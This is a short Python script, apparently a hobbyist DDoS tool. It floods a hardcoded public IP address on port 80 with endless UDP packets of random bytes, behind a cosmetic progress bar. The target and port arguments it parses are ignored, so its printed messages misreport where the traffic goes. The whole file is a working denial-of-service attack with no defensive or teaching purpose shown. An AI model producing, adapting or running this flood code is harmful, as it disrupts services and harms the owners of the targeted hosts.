import argparse
import socket
import threading
import time
import random
import sys
import os

################

ip = "77.88.55.80"
port = 80
bytes = random._urandom(29800)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

################

parser = argparse.ArgumentParser()

parser.add_argument("--target", "-t", help="set ddos target <IP>")
parser.add_argument("--port", "-p", help="set ddos port <PORT>")

args = parser.parse_args()

os.system("clear")
print("figlet Attack Starting")
print ("[                    ] 0% ")
time.sleep(2)
os.system("clear")
print("figlet Attack Starting")
print ("[=====               ] 25%")
time.sleep(2)
os.system("clear")
print("figlet Attack Starting")
print ("[==========          ] 50%")
time.sleep(2)
os.system("clear")
print("figlet Attack Starting")
print ("[===============     ] 75%")
time.sleep(2)
os.system("clear")
print("figlet Attack Starting")
print ("[====================] 100%")
time.sleep(3)
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,args.target,args.port))
